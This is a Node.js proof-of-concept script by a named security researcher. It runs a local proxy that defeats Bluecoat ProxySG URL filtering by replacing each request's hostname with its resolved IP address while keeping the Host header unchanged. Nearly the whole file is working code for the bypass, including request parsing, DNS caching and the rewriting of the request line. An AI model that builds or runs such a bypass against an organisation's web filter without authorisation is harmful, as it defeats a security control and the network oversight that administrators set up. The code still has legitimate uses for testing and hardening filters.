/**
 * BluecoatFilteringBypassProxy - for NodeJS
 *
 * @author Arno0x0x - https://twitter.com/Arno0x0x
 * @license GPLv3 - licence available here: http://www.gnu.org/copyleft/gpl.html
 * @link https://github.com/Arno0x/
 *
 * This script is a VERY BASIC PoC for bypassing Bluecoat ProxySG webfilter function by replacing
 * the origin server hostname (FQDN) in the URL with its IP address, while keeping the HTTP 'Host'
 * header untouched.
 * 
 * This technique defeats the BlueCoat webfilter filtering most of the time (but NOT always !) hence
 * allowing bypass of URL filtering patterns.
 * 
 * For HTTPS connections, you can expect different behaviors depending on whether SSL Interception
 * is enabled or not.
 *
 */

var net = require('net');
var urlParser = require('url');
var dns = require('dns');

// Object to hold every successful DNS lookup for a given hostname, avoiding useless further lookups
var dnsLookupCache = {};
 
process.on('uncaughtException', function(e) {
    console.log(e);
});
 

//========================================================================
// MAIN VARIABLES :
// - proxyPort : Integer - Sets the TCP port the proxy will be listening on
// - serviceProxy : String - Defines the Bluecoat upstream proxy name or IP
// - servicePort : Integer - Defines the Bluecoat upstream proxy TCP port
//========================================================================
var proxyPort = 8888;
var serviceProxy = 'bluecoatproxy.corp.com';
var servicePort = 8080;

//========================================================================
// Main handler: once the proxy is ready listening on its proxyPort
//======================================================================== 
net.createServer(function (proxySocket) {

  var connected = false;
  var buffers = new Array();
  var serviceSocket = new net.Socket();

  //========================================================================
  // Handler for the service socket once connected
  //========================================================================
  serviceSocket.connect(servicePort, serviceProxy, function() {
    connected = true;

    // We might have buffered some data while establishing the serviceSocket
    if (buffers.length > 0) {
      for (i = 0; i < buffers.length; i++) {
        serviceSocket.write(buffers[i]);
      }
    }
  });

  //========================================================================
  // Handlers for errors on sockets
  //========================================================================
  proxySocket.on('error', function (e) {
    serviceSocket.end();
  });

  serviceSocket.on('error', function (e) {
    console.log('Could not connect to service at host '+serviceProxy+', port '+servicePort);
    console.log(e);
    proxySocket.end();
  });

  //========================================================================
  // Handler called upon new data event on coming on the proxy socket
  //========================================================================
  proxySocket.on('data', function (data) {

    //-------------------------------------------------
    // WARNING: This is the most basic parser ever - It 's far from handling all possible cases.
    // Just parsing what we're interested in.
    //-------------------------------------------------

    // Parsing the data received
    // Looking for HTTP request VERBS. Only one supported by this proxy: GET/POST/CONNECT
    var httpVerb = data.toString('utf-8',0,3);

    //-----------------------------------------
    // Handling GET, POST and CONNECT cases
    if (httpVerb === 'GET' || httpVerb === 'POS' || httpVerb === 'CON') {

      // The data buffer contains an HTTP request.
      // Extracting the first line only. To do so, find the first 'CR/LF' = '0x0D\0x0A' index in the data buffer
      var newlineIndex = 0;
      while (true) {
        if (data[newlineIndex] === 0x0d && data[newlineIndex+1] === 0x0a)
          break;
        else
          newlineIndex++;
      }

      var clientRequest = data.toString('utf8',0,newlineIndex).split(' ');
      var method = clientRequest[0];
      var url = clientRequest[1];
      var httpVersion = clientRequest[2];
      
      console.log('>> ORIGINAL Client Request: [%s] [%s] [%s]',method,url,httpVersion);

      var hostName;
      var portNumber;
      var hostIP;
      var urlObject;

      if (httpVerb === 'GET' || httpVerb === 'POS') {
        urlObject = urlParser.parse(url);
        hostName = urlObject.hostname;
      }
      else {
        hostName = url.split(':')[0];
        portNumber = url.split(':')[1];
      }

      //------------------------------------------
      // Resolving the IP address for the hostname

      //Check if we already have a name resolution for this host in our cache
      if (dnsLookupCache[hostName] == null) {
        // Perform the DNS lookup and store into the result in a cache for future reference
        dns.lookup(hostName, function onLookup(err, addresses, family) {
          if (!err) {
            console.log ('Resolving IP');
            dnsLookupCache[hostName] = addresses;
            hostIP = dnsLookupCache[hostName];          
            sendData();
          }
        });
      }
      else {
        console.log ('Cache Hit');
        hostIP = dnsLookupCache[hostName];
        sendData();
      }

      //=================================================================
      // Sending the data on the service socket
      //=================================================================
      function sendData() {

        //---------------------------------------------------------------------------------
        // Rebuild the HTTP request, overwriting the hostname with its IP
        var newClientRequest;

        if (httpVerb === 'GET' || httpVerb === 'POS') {
          newClientRequest = method+' '+urlObject.protocol+'//'+hostIP+urlObject.path+' '+httpVersion;
        }
        else {
          newClientRequest = method+' '+hostIP+':'+portNumber+' '+httpVersion;
        }

        console.log('>> REWRITTEN Client Request: [%s]',newClientRequest);
        
        var changedData = new Buffer(newClientRequest+'\r\n','utf8');
        var unchangedData = data.slice(newlineIndex+2);
        var finalData = Buffer.concat([changedData, unchangedData]);
            
        //-----------------------------------------------
        // Send the data on the service socket
        if (connected) {
          serviceSocket.write(finalData);
        } else {
          buffers[buffers.length] = finalData;
        }
      } // end function sendData()

    } // End if httpVerb is GET, POST or CONNECT
    else {

      // This is the case where data from the client does not contain, apparently (remember the lame parser), an HTTP request
      // so we just pass the data on
      serviceSocket.write(data);  
    }
  });

  serviceSocket.on('data', function(data) {
    proxySocket.write(data);
  });

  proxySocket.on('close', function(had_error) {
    serviceSocket.end();
  });

  serviceSocket.on('close', function(had_error) {
    proxySocket.end();
  });

}).listen(proxyPort, function () {
  console.log ('Proxy listening on port %s - Forwarding traffic to %s:%s',proxyPort,serviceProxy,servicePort);
});